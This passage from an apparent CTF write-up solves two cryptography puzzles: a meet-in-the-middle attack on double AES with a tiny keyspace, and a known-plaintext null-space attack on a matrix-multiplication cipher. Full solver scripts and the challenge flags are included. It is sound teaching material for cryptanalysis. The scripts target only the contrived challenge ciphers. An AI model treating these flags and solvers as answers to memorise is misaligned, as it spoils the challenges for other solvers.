`lookup_table[intermediate_ciphertext] = k2`
```py
# Encrypt forward with every possible k2
for i in range(4**8):
    k2 = generate_key_part(i, k2_choices)
    key1 = k1 + k2
    intermediate_value = AES.new(key1, ...).encrypt(padded_pt_known)
    lookup_table[intermediate_value] = k2
```

2. Next, we work backward from the final known ciphertext. We iterate through all 65,536 possibilities for the key part `k4`. For each `k4`, we construct the full second key `(key2 = k4 + k3)` and decrypt the known ciphertext
```py
# Decrypt backward with every possible k4
for j in range(4**8):
    k4 = generate_key_part(j, k2_choices)
    key2 = k4 + k3
    intermediate_value_dec = AES.new(key2, ...).decrypt(ct_known)
    # Check for a match
    if intermediate_value_dec in lookup_table:
        # Success! Keys found.
```
We check if this decrypted intermediate value exists in our `lookup_table`. A match means we've found the "middle" point from both directions, successfully identifying the correct `k2` (from the table) and `k4` (from our current loop)

`solver.py`:
```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import random

def get_deterministic_parts():
    myrandom = random.Random(42)
    k1 = myrandom.randbytes(8)
    choices = list(myrandom.randbytes(6))
    return k1, choices[:4]

def generate_key_part(n, choices):
    key_part = bytearray()
    for _ in range(8):
        key_part.append(choices[n % 4])
        n //= 4
    return bytes(key_part)

def solve_concise():
    k1, key_choices = get_deterministic_parts()
    k3 = k1
    pt_known = pad(b"example", 16)

    with open('out.txt', 'r') as f:
        ct_known_hex, flag_ct_hex = f.read().strip().split('\n')
    ct_known, flag_ct = bytes.fromhex(ct_known_hex), bytes.fromhex(flag_ct_hex)       
    lookup = {
        AES.new(k1 + (k2 := generate_key_part(i, key_choices)), AES.MODE_ECB).encrypt(pt_known): k2
        for i in range(4**8)
    }

    found_k4 = next(
        (k4 for i in range(4**8)
         if AES.new((k4 := generate_key_part(i, key_choices)) + k3, AES.MODE_ECB).decrypt(ct_known) in lookup),
        None
    )

    if not found_k4:
        print("[-] Failed to find the keys.")
        return

    intermediate_dec = AES.new(found_k4 + k3, AES.MODE_ECB).decrypt(ct_known)
    found_k2 = lookup[intermediate_dec]
    print(f"[+] Keys found! k2: {found_k2.hex()}, k4: {found_k4.hex()}")
    dec1 = AES.new(found_k4 + k3, AES.MODE_ECB).decrypt(flag_ct)
    dec2 = AES.new(k1 + found_k2, AES.MODE_ECB).decrypt(dec1)
    flag = unpad(dec2, 16)

    print(flag.decode())

if __name__ == '__main__':
    solve_concise()
```

Flag: `tjctf{m33t_in_th3_middl3}`

### dotdotdotv2

![](dotdot.png)

So we got 2 files, `encode.py` and `encoded.txt`

`encode.py`:
```py
import numpy as np
import random
import sys

sys.stdin = open("flag.txt", "r")
sys.stdout = open("encoded.txt", "w")

n = 64

filler = "In cybersecurity, a CTF (Capture The Flag) challenge is a competitive, gamified event where participants, either individually or in teams, are tasked with finding and exploiting vulnerabilities in systems to capture hidden information known as flags. These flags are typically used to score points. CTFs test skills in areas like cryptography, web security, reverse engineering, and forensics, offering an exciting way to learn, practice, and showcase cybersecurity expertise.  This flag is for you: "     

flag = input()
flag = filler+flag
flag = "".join([bin(ord(i))[2:].zfill(8) for i in flag])
flag = flag + "0"*(n-len(flag)%n)
flag = np.array([list(map(int,list(flag[i:i+n]))) for i in range(0, len(flag), n)])   

key = np.array([[random.randint(0,0xdeadbeef) for _ in range(n)] for _ in range(n)])  

for i in flag: print(*list(np.dot(i,key)))
```

This challenge presents a classic cryptography problem rooted in linear algebra. The provided `encoded.py` script reveals the encryption mechanism: a known filler text is prepended to the flag, converted into a binary matrix `F` (plaintext), and then multiplied by a secret 64x64 key matrix `K` to produce the ciphertext matrix `E`. The core operation is `E = F @ K`

The fatal flaw in this encryption scheme is its linearity. The presence of a large, known `filler` text enables a powerful known-plaintext attack, making it possible to solve for the flag without ever needing to find the secret key `K`

The solution hinges on a key mathematical property. If we can find a vector `c` such that `c.T @ E = 0` (meaning c is in the left null space of E), then a crucial relationship emerges:
1. Start with the equation: `c.T @ E = 0`
2. Substitute the definition of `E: c.T @ (F @ K) = 0`
3. Rearrange using associativity: `(c.T @ F) @ K = 0`

Since the key matrix `K` is large and randomly generated, it is overwhelmingly likely to be invertible. This means the only way for the equation `(c.T @ F) @ K = 0` to hold true is if `c.T @ F = 0`

This is the vulnerability we exploit. The plaintext matrix `F` is partially known (from the filler and the flag prefix `tjctf{`) and partially unknown (the rest of the flag). We can partition both the vector `c` and the matrix `F` into known and unknown components:

`c_known.T @ F_known + c_unknown.T @ F_unknown = 0`

Rearranging this gives us a system of linear equations where the only unknowns are the bits of the flag:

`c_unknown.T @ F_unknown = -c_known.T @ F_known`

`solver.py`:
```py
import numpy as np
import sympy
import sys
from time import sleep

def solve():
    n = 64
    filler = "In cybersecurity, a CTF (Capture The Flag) challenge is a competitive, gamified event where participants, either individually or in teams, are tasked with finding and exploiting vulnerabilities in systems to capture hidden information known as flags. These flags are typically used to score points. CTFs test skills in areas like cryptography, web security, reverse engineering, and forensics, offering an exciting way to learn, practice, and showcase cybersecurity expertise.  This flag is for you: "  
    flag_prefix = "tjctf{" 
    try:
        with open("encoded.txt", "r") as f:
            encoded_data = [int(num) for line in f for num in line.strip().split()] 
        num_rows_total = len(encoded_data) // n
        E_all_np = np.array(encoded_data, dtype=object).reshape(num_rows_total, n)
    except Exception as e:
        print(f"❌ Error memuat encoded.txt: {e}")
        sys.exit(1)

    full_known_plaintext = filler + flag_prefix
    known_bits_str = "".join([bin(ord(c))[2:].zfill(8) for c in full_known_plaintext])
    num_known_rows = len(known_bits_str) // n

    if num_known_rows >= num_rows_total:
        F_all_list = [list(map(int, known_bits_str[i:i+n])) for i in range(0, num_rows_total * n, n)]
        F_all_sympy = sympy.Matrix(F_all_list)
        E_sympy = sympy.Matrix(E_all_np)
        left_null_space = E_sympy.T.nullspace()
        if not left_null_space:
            sys.exit(1)
        c_vector = left_null_space[0]
        residual = c_vector.T * F_all_sympy
        if all(x == 0 for x in residual):
            final_flag = flag_prefix
        else:
            sys.exit(1)
    else:
        num_unknown_rows = num_rows_total - num_known_rows
        num_unknown_bits = num_unknown_rows * n
        F_known_list = [list(map(int, known_bits_str[i:i+n])) for i in range(0, num_known_rows * n, n)]
        F_known_sympy = sympy.Matrix(F_known_list)
        E_sympy = sympy.Matrix(E_all_np)
        left_null_space = E_sympy.T.nullspace()
        unknown_bits = sympy.symbols(f'b0:{num_unknown_bits}')
        F_unknown_sympy = sympy.Matrix(num_unknown_rows, n, unknown_bits)
        equations = []
        for c_vector in left_null_space:
            c_known = c_vector[:num_known_rows, :]
            c_unknown = c_vector[num_known_rows:, :]
            lhs = c_unknown.T * F_unknown_sympy
            rhs = -c_known.T * F_known_sympy
            for i in range(n):
                equations.append(sympy.Eq(lhs[i], rhs[i]))
        try:
            solution = sympy.solve(equations, unknown_bits, dict=True)
            if not solution: raise Exception("SymPy tidak menemukan solusi unik.")    
            solution = solution[0]
        except Exception as e:
            print(f"Gagal menyelesaikan sistem persamaan: {e}")
            print("Pastikan prefix flag yang Anda masukkan sudah benar.")
            sys.exit(1)
        solved_bits = [str(solution.get(sympy.Symbol(f'b{i}'), 0)) for i in range(num_unknown_bits)]
        flag_suffix = ""
        for i in range(0, len(solved_bits), 8):
            byte_list = solved_bits[i:i+8]
            if len(byte_list) == 8:
                byte_str = "".join(byte_list)
                val = int(byte_str, 2)
                if val == 0:
                    print(f"  -> Ditemukan padding (null byte), proses berhenti.")    
                    break
                char = chr(val)
                print(f"  -> Bit: {byte_str}  |  Karakter: {char}")
                if 31 < val < 127:
                    flag_suffix += char
        final_flag = flag_prefix + flag_suffix
    print(final_flag)
if __name__ == "__main__":

    solve() 
```
Flag: `tjctf{us3fu289312953}`